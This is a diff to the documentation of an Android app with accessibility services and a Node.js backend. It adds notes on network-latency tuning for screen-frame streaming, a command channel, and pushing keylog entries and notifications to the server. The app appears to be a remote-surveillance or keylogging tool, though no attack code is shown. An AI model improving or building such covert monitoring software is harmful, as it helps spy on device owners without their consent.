@@ -105,6 +105,22 @@ Two accessibility services are declared in the manifest:
 
 Resource: `res/xml/accessibility_service_config_standalone.xml`
 
+## 3G / Low-Network Latency Optimizations (Applied)
+
+### Android (`app/src/main/java/…/network/SocketManager.java`)
+- **Per-channel send locks** (`primaryLock`, `streamLock`, `liveLock`) — eliminated the shared `synchronized(this)` that caused 100 000+ ms device latency. A slow JPEG write on the stream channel no longer blocks the command or live channel.
+- **`streamWriteBusy` AtomicBoolean** — drops new frames when the previous frame write is still blocking in the kernel (3G back-pressure). Prevents unbounded TCP buffer queuing.
+- **Live-channel pong + stream-channel pong** use their channel lock to prevent output corruption from concurrent writes.
+- **`pushKeylogEntry` / `pushNotification` / `pushRecentActivity`** now use the general cached `executor` instead of `liveExecutor`. The `liveExecutor` single thread is permanently occupied by `liveChannelLoop`'s blocking `readLine()` — tasks submitted to it were silently queued forever.
+- **`scheduleAtFixedRate` → `scheduleWithFixedDelay`** for idle-frame and block-frame modes — waits for the previous frame write to complete before scheduling the next one. Prevents cascading frame backlog on slow links.
+
+### Backend (`backend/server.js`)
+- **`compression` middleware** (gzip, level 6) added for all HTTP responses; SSE streams are explicitly excluded.
+- **JSON body limit** reduced from 50 MB to 20 MB.
+- **Static asset caching** (1 h max-age) added.
+- **TCP server** — `allowHalfOpen: false`, `setKeepAlive(true, 15000)`, `setRecvBufferSize(262144)` (256 KB) for burst tolerance.
+- **Timing constants**: `PING_INTERVAL` 30 s → 20 s; `PONG_TIMEOUT` 120 s → 90 s; `CMD_TIMEOUT_MS` 60 s → 45 s.
+
 ## Build
 
 Android build output: `app/build/outputs/apk/debug/app-debug.apk`
